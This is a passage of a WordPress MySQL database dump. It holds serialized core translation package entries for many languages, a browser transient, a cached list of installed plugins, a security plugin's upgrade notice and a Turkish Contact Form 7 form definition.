15:39:53\";s:12:\"english_name\";s:6:\"Korean\";s:11:\"native_name\";s:9:\"한국어\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/ko_KR.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ko\";i:2;s:3:\"kor\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"계속\";}}s:3:\"ckb\";a:8:{s:8:\"language\";s:3:\"ckb\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:48:25\";s:12:\"english_name\";s:16:\"Kurdish (Sorani)\";s:11:\"native_name\";s:13:\"كوردی‎\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/ckb.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ku\";i:3;s:3:\"ckb\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:30:\"به‌رده‌وام به‌\";}}s:2:\"lo\";a:8:{s:8:\"language\";s:2:\"lo\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-11-12 09:59:23\";s:12:\"english_name\";s:3:\"Lao\";s:11:\"native_name\";s:21:\"ພາສາລາວ\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/lo.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"lo\";i:2;s:3:\"lao\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:18:\"ຕໍ່​ໄປ\";}}s:5:\"lt_LT\";a:8:{s:8:\"language\";s:5:\"lt_LT\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:54:34\";s:12:\"english_name\";s:10:\"Lithuanian\";s:11:\"native_name\";s:15:\"Lietuvių kalba\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/lt_LT.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"lt\";i:2;s:3:\"lit\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Tęsti\";}}s:2:\"lv\";a:8:{s:8:\"language\";s:2:\"lv\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-27 07:51:28\";s:12:\"english_name\";s:7:\"Latvian\";s:11:\"native_name\";s:16:\"Latviešu valoda\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/lv.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"lv\";i:2;s:3:\"lav\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Turpināt\";}}s:5:\"mk_MK\";a:8:{s:8:\"language\";s:5:\"mk_MK\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:54:41\";s:12:\"english_name\";s:10:\"Macedonian\";s:11:\"native_name\";s:31:\"Македонски јазик\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/mk_MK.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"mk\";i:2;s:3:\"mkd\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:16:\"Продолжи\";}}s:5:\"ml_IN\";a:8:{s:8:\"language\";s:5:\"ml_IN\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-27 03:43:32\";s:12:\"english_name\";s:9:\"Malayalam\";s:11:\"native_name\";s:18:\"മലയാളം\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/ml_IN.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ml\";i:2;s:3:\"mal\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:18:\"തുടരുക\";}}s:2:\"mn\";a:8:{s:8:\"language\";s:2:\"mn\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-12 07:29:35\";s:12:\"english_name\";s:9:\"Mongolian\";s:11:\"native_name\";s:12:\"Монгол\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/mn.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"mn\";i:2;s:3:\"mon\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:24:\"Үргэлжлүүлэх\";}}s:2:\"mr\";a:8:{s:8:\"language\";s:2:\"mr\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:42:37\";s:12:\"english_name\";s:7:\"Marathi\";s:11:\"native_name\";s:15:\"मराठी\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/mr.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"mr\";i:2;s:3:\"mar\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:25:\"सुरु ठेवा\";}}s:5:\"ms_MY\";a:8:{s:8:\"language\";s:5:\"ms_MY\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:54:49\";s:12:\"english_name\";s:5:\"Malay\";s:11:\"native_name\";s:13:\"Bahasa Melayu\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/ms_MY.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ms\";i:2;s:3:\"msa\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Teruskan\";}}s:5:\"my_MM\";a:8:{s:8:\"language\";s:5:\"my_MM\";s:7:\"version\";s:6:\"4.1.16\";s:7:\"updated\";s:19:\"2015-03-26 15:57:42\";s:12:\"english_name\";s:17:\"Myanmar (Burmese)\";s:11:\"native_name\";s:15:\"ဗမာစာ\";s:7:\"package\";s:65:\"https://downloads.wordpress.org/translation/core/4.1.16/my_MM.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"my\";i:2;s:3:\"mya\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:54:\"ဆက်လက်လုပ်ဆောင်ပါ။\";}}s:5:\"nb_NO\";a:8:{s:8:\"language\";s:5:\"nb_NO\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:42:31\";s:12:\"english_name\";s:19:\"Norwegian (Bokmål)\";s:11:\"native_name\";s:13:\"Norsk bokmål\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/nb_NO.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"nb\";i:2;s:3:\"nob\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Fortsett\";}}s:5:\"ne_NP\";a:8:{s:8:\"language\";s:5:\"ne_NP\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:48:31\";s:12:\"english_name\";s:6:\"Nepali\";s:11:\"native_name\";s:18:\"नेपाली\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/ne_NP.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ne\";i:2;s:3:\"nep\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:43:\"जारी राख्नुहोस्\";}}s:5:\"nl_BE\";a:8:{s:8:\"language\";s:5:\"nl_BE\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:49:13\";s:12:\"english_name\";s:15:\"Dutch (Belgium)\";s:11:\"native_name\";s:20:\"Nederlands (België)\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/nl_BE.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"nl\";i:2;s:3:\"nld\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Doorgaan\";}}s:12:\"nl_NL_formal\";a:8:{s:8:\"language\";s:12:\"nl_NL_formal\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-16 13:24:21\";s:12:\"english_name\";s:14:\"Dutch (Formal)\";s:11:\"native_name\";s:20:\"Nederlands (Formeel)\";s:7:\"package\";s:71:\"https://downloads.wordpress.org/translation/core/4.7.2/nl_NL_formal.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"nl\";i:2;s:3:\"nld\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Doorgaan\";}}s:5:\"nl_NL\";a:8:{s:8:\"language\";s:5:\"nl_NL\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-03-03 13:02:03\";s:12:\"english_name\";s:5:\"Dutch\";s:11:\"native_name\";s:10:\"Nederlands\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/nl_NL.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"nl\";i:2;s:3:\"nld\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Doorgaan\";}}s:5:\"nn_NO\";a:8:{s:8:\"language\";s:5:\"nn_NO\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:40:57\";s:12:\"english_name\";s:19:\"Norwegian (Nynorsk)\";s:11:\"native_name\";s:13:\"Norsk nynorsk\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/nn_NO.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"nn\";i:2;s:3:\"nno\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Hald fram\";}}s:3:\"oci\";a:8:{s:8:\"language\";s:3:\"oci\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-02 13:47:38\";s:12:\"english_name\";s:7:\"Occitan\";s:11:\"native_name\";s:7:\"Occitan\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/oci.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"oc\";i:2;s:3:\"oci\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Contunhar\";}}s:5:\"pa_IN\";a:8:{s:8:\"language\";s:5:\"pa_IN\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-16 05:19:43\";s:12:\"english_name\";s:7:\"Punjabi\";s:11:\"native_name\";s:18:\"ਪੰਜਾਬੀ\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/pa_IN.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"pa\";i:2;s:3:\"pan\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:25:\"ਜਾਰੀ ਰੱਖੋ\";}}s:5:\"pl_PL\";a:8:{s:8:\"language\";s:5:\"pl_PL\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-09 22:44:40\";s:12:\"english_name\";s:6:\"Polish\";s:11:\"native_name\";s:6:\"Polski\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/pl_PL.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"pl\";i:2;s:3:\"pol\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Kontynuuj\";}}s:2:\"ps\";a:8:{s:8:\"language\";s:2:\"ps\";s:7:\"version\";s:6:\"4.1.16\";s:7:\"updated\";s:19:\"2015-03-29 22:19:48\";s:12:\"english_name\";s:6:\"Pashto\";s:11:\"native_name\";s:8:\"پښتو\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.1.16/ps.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ps\";i:2;s:3:\"pus\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:19:\"دوام ورکړه\";}}s:5:\"pt_BR\";a:8:{s:8:\"language\";s:5:\"pt_BR\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-17 03:35:07\";s:12:\"english_name\";s:19:\"Portuguese (Brazil)\";s:11:\"native_name\";s:20:\"Português do Brasil\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/pt_BR.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"pt\";i:2;s:3:\"por\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:5:\"pt_PT\";a:8:{s:8:\"language\";s:5:\"pt_PT\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-20 18:48:35\";s:12:\"english_name\";s:21:\"Portuguese (Portugal)\";s:11:\"native_name\";s:10:\"Português\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/pt_PT.zip\";s:3:\"iso\";a:1:{i:1;s:2:\"pt\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuar\";}}s:3:\"rhg\";a:8:{s:8:\"language\";s:3:\"rhg\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-03-16 13:03:18\";s:12:\"english_name\";s:8:\"Rohingya\";s:11:\"native_name\";s:8:\"Ruáinga\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/rhg.zip\";s:3:\"iso\";a:1:{i:3;s:3:\"rhg\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:0:\"\";}}s:5:\"ro_RO\";a:8:{s:8:\"language\";s:5:\"ro_RO\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:42:11\";s:12:\"english_name\";s:8:\"Romanian\";s:11:\"native_name\";s:8:\"Română\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/ro_RO.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ro\";i:2;s:3:\"ron\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Continuă\";}}s:5:\"ru_RU\";a:8:{s:8:\"language\";s:5:\"ru_RU\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-03-03 06:09:17\";s:12:\"english_name\";s:7:\"Russian\";s:11:\"native_name\";s:14:\"Русский\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/ru_RU.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ru\";i:2;s:3:\"rus\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:20:\"Продолжить\";}}s:3:\"sah\";a:8:{s:8:\"language\";s:3:\"sah\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-21 02:06:41\";s:12:\"english_name\";s:5:\"Sakha\";s:11:\"native_name\";s:14:\"Сахалыы\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/sah.zip\";s:3:\"iso\";a:2:{i:2;s:3:\"sah\";i:3;s:3:\"sah\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:12:\"Салҕаа\";}}s:5:\"si_LK\";a:8:{s:8:\"language\";s:5:\"si_LK\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-11-12 06:00:52\";s:12:\"english_name\";s:7:\"Sinhala\";s:11:\"native_name\";s:15:\"සිංහල\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/si_LK.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"si\";i:2;s:3:\"sin\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:44:\"දිගටම කරගෙන යන්න\";}}s:5:\"sk_SK\";a:8:{s:8:\"language\";s:5:\"sk_SK\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-03-02 14:28:53\";s:12:\"english_name\";s:6:\"Slovak\";s:11:\"native_name\";s:11:\"Slovenčina\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/sk_SK.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"sk\";i:2;s:3:\"slk\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:12:\"Pokračovať\";}}s:5:\"sl_SI\";a:8:{s:8:\"language\";s:5:\"sl_SI\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-08 17:57:45\";s:12:\"english_name\";s:9:\"Slovenian\";s:11:\"native_name\";s:13:\"Slovenščina\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/sl_SI.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"sl\";i:2;s:3:\"slv\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:8:\"Nadaljuj\";}}s:2:\"sq\";a:8:{s:8:\"language\";s:2:\"sq\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-29 18:17:50\";s:12:\"english_name\";s:8:\"Albanian\";s:11:\"native_name\";s:5:\"Shqip\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/sq.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"sq\";i:2;s:3:\"sqi\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"Vazhdo\";}}s:5:\"sr_RS\";a:8:{s:8:\"language\";s:5:\"sr_RS\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:41:03\";s:12:\"english_name\";s:7:\"Serbian\";s:11:\"native_name\";s:23:\"Српски језик\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/sr_RS.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"sr\";i:2;s:3:\"srp\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:14:\"Настави\";}}s:5:\"sv_SE\";a:8:{s:8:\"language\";s:5:\"sv_SE\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:40:55\";s:12:\"english_name\";s:7:\"Swedish\";s:11:\"native_name\";s:7:\"Svenska\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/sv_SE.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"sv\";i:2;s:3:\"swe\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:9:\"Fortsätt\";}}s:3:\"szl\";a:8:{s:8:\"language\";s:3:\"szl\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-09-24 19:58:14\";s:12:\"english_name\";s:8:\"Silesian\";s:11:\"native_name\";s:17:\"Ślōnskŏ gŏdka\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/szl.zip\";s:3:\"iso\";a:1:{i:3;s:3:\"szl\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:13:\"Kōntynuować\";}}s:5:\"ta_IN\";a:8:{s:8:\"language\";s:5:\"ta_IN\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-27 03:22:47\";s:12:\"english_name\";s:5:\"Tamil\";s:11:\"native_name\";s:15:\"தமிழ்\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/ta_IN.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ta\";i:2;s:3:\"tam\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:24:\"தொடரவும்\";}}s:2:\"te\";a:8:{s:8:\"language\";s:2:\"te\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:47:39\";s:12:\"english_name\";s:6:\"Telugu\";s:11:\"native_name\";s:18:\"తెలుగు\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/te.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"te\";i:2;s:3:\"tel\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:30:\"కొనసాగించు\";}}s:2:\"th\";a:8:{s:8:\"language\";s:2:\"th\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:48:43\";s:12:\"english_name\";s:4:\"Thai\";s:11:\"native_name\";s:9:\"ไทย\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/th.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"th\";i:2;s:3:\"tha\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:15:\"ต่อไป\";}}s:2:\"tl\";a:8:{s:8:\"language\";s:2:\"tl\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-12-30 02:38:08\";s:12:\"english_name\";s:7:\"Tagalog\";s:11:\"native_name\";s:7:\"Tagalog\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/tl.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"tl\";i:2;s:3:\"tgl\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:10:\"Magpatuloy\";}}s:5:\"tr_TR\";a:8:{s:8:\"language\";s:5:\"tr_TR\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-17 11:46:52\";s:12:\"english_name\";s:7:\"Turkish\";s:11:\"native_name\";s:8:\"Türkçe\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/tr_TR.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"tr\";i:2;s:3:\"tur\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:5:\"Devam\";}}s:5:\"tt_RU\";a:8:{s:8:\"language\";s:5:\"tt_RU\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-11-20 20:20:50\";s:12:\"english_name\";s:5:\"Tatar\";s:11:\"native_name\";s:19:\"Татар теле\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/tt_RU.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"tt\";i:2;s:3:\"tat\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:17:\"дәвам итү\";}}s:3:\"tah\";a:8:{s:8:\"language\";s:3:\"tah\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-03-06 18:39:39\";s:12:\"english_name\";s:8:\"Tahitian\";s:11:\"native_name\";s:10:\"Reo Tahiti\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/tah.zip\";s:3:\"iso\";a:3:{i:1;s:2:\"ty\";i:2;s:3:\"tah\";i:3;s:3:\"tah\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:0:\"\";}}s:5:\"ug_CN\";a:8:{s:8:\"language\";s:5:\"ug_CN\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-12-05 09:23:39\";s:12:\"english_name\";s:6:\"Uighur\";s:11:\"native_name\";s:9:\"Uyƣurqə\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/ug_CN.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ug\";i:2;s:3:\"uig\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:26:\"داۋاملاشتۇرۇش\";}}s:2:\"uk\";a:8:{s:8:\"language\";s:2:\"uk\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-21 17:42:28\";s:12:\"english_name\";s:9:\"Ukrainian\";s:11:\"native_name\";s:20:\"Українська\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/uk.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"uk\";i:2;s:3:\"ukr\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:20:\"Продовжити\";}}s:2:\"ur\";a:8:{s:8:\"language\";s:2:\"ur\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-30 07:08:17\";s:12:\"english_name\";s:4:\"Urdu\";s:11:\"native_name\";s:8:\"اردو\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/ur.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ur\";i:2;s:3:\"urd\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:19:\"جاری رکھیں\";}}s:5:\"uz_UZ\";a:8:{s:8:\"language\";s:5:\"uz_UZ\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-15 15:45:53\";s:12:\"english_name\";s:5:\"Uzbek\";s:11:\"native_name\";s:11:\"O‘zbekcha\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/uz_UZ.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"uz\";i:2;s:3:\"uzb\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:11:\"Davom etish\";}}s:2:\"vi\";a:8:{s:8:\"language\";s:2:\"vi\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-27 02:33:07\";s:12:\"english_name\";s:10:\"Vietnamese\";s:11:\"native_name\";s:14:\"Tiếng Việt\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/vi.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"vi\";i:2;s:3:\"vie\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:12:\"Tiếp tục\";}}s:5:\"zh_CN\";a:8:{s:8:\"language\";s:5:\"zh_CN\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:54:45\";s:12:\"english_name\";s:15:\"Chinese (China)\";s:11:\"native_name\";s:12:\"简体中文\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/zh_CN.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"zh\";i:2;s:3:\"zho\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"继续\";}}s:5:\"zh_HK\";a:8:{s:8:\"language\";s:5:\"zh_HK\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:55:14\";s:12:\"english_name\";s:19:\"Chinese (Hong Kong)\";s:11:\"native_name\";s:16:\"香港中文版	\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/zh_HK.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"zh\";i:2;s:3:\"zho\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"繼續\";}}s:5:\"zh_TW\";a:8:{s:8:\"language\";s:5:\"zh_TW\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-02-14 16:53:54\";s:12:\"english_name\";s:16:\"Chinese (Taiwan)\";s:11:\"native_name\";s:12:\"繁體中文\";s:7:\"package\";s:64:\"https://downloads.wordpress.org/translation/core/4.7.2/zh_TW.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"zh\";i:2;s:3:\"zho\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:6:\"繼續\";}}}","no");
INSERT INTO `cmrfu_options` VALUES("19383","_site_transient_timeout_browser_e9759623ada108579a8a752b70481b56","1486818484","no");
INSERT INTO `cmrfu_options` VALUES("19384","_site_transient_browser_e9759623ada108579a8a752b70481b56","a:9:{s:8:\"platform\";s:9:\"Macintosh\";s:4:\"name\";s:6:\"Chrome\";s:7:\"version\";s:12:\"55.0.2883.95\";s:10:\"update_url\";s:28:\"http://www.google.com/chrome\";s:7:\"img_src\";s:49:\"http://s.wordpress.org/images/browsers/chrome.png\";s:11:\"img_src_ssl\";s:48:\"https://wordpress.org/images/browsers/chrome.png\";s:15:\"current_version\";s:2:\"18\";s:7:\"upgrade\";b:0;s:8:\"insecure\";b:0;}","no");
INSERT INTO `cmrfu_options` VALUES("19393","_transient_timeout_plugin_slugs","1490262498","no");
INSERT INTO `cmrfu_options` VALUES("19394","_transient_plugin_slugs","a:13:{i:0;s:19:\"akismet/akismet.php\";i:1;s:51:\"all-in-one-wp-security-and-firewall/wp-security.php\";i:2;s:16:\"gotmls/index.php\";i:3;s:36:\"contact-form-7/wp-contact-form-7.php\";i:4;s:9:\"hello.php\";i:5;s:35:\"jquery-colorbox/jquery-colorbox.php\";i:6;s:39:\"lockdown-wp-admin/lockdown-wp-admin.php\";i:7;s:47:\"really-simple-captcha/really-simple-captcha.php\";i:8;s:23:\"revslider/revslider.php\";i:9;s:20:\"smtp-mailer/main.php\";i:10;s:41:\"wordpress-importer/wordpress-importer.php\";i:11;s:27:\"wp-super-cache/wp-cache.php\";i:12;s:24:\"wordpress-seo/wp-seo.php\";}","no");
INSERT INTO `cmrfu_options` VALUES("19395","_transient_timeout_GOTMLS_upgrade_notice_4.16.39_4.16.49","1486300502","no");
INSERT INTO `cmrfu_options` VALUES("19396","_transient_GOTMLS_upgrade_notice_4.16.39_4.16.49","<div class=\"GOTMLS_upgrade_notice\"><li><b>4.16.49:</b> Fixed syntax error in the XMLRPC patch for newer versions of Apache.

</li><li><b>4.16.48:</b> Added fall-back to manual updates if the Automatic update feature fails, fixed PHP Notices  and improved Apache version detection.

</li><li><b>4.16.47:</b> Changed Automatic update feature, added PHP and Apache version detections, and removed the onbeforeunload function other code that was deprecated.</li></div>","no");


DROP TABLE IF EXISTS `cmrfu_postmeta`;

CREATE TABLE `cmrfu_postmeta` (
  `meta_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `post_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci,
  PRIMARY KEY (`meta_id`),
  KEY `post_id` (`post_id`),
  KEY `meta_key` (`meta_key`(191))
) ENGINE=MyISAM AUTO_INCREMENT=2197 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_postmeta` VALUES("2","4","_form","<p>Adınız (gerekli)<br />
    [text* your-name] </p>

<p>Epostanız (gerekli)<br />
    [email* your-email] </p>

<p>Konu<br />
    [text your-subject] </p>

<p>İletiniz<br />
    [textarea your-message] </p>
<p>[captchac captcha-897 size:m] [captchar captcha-897]</p>

<p>[submit \"Gönder\"]</p>");
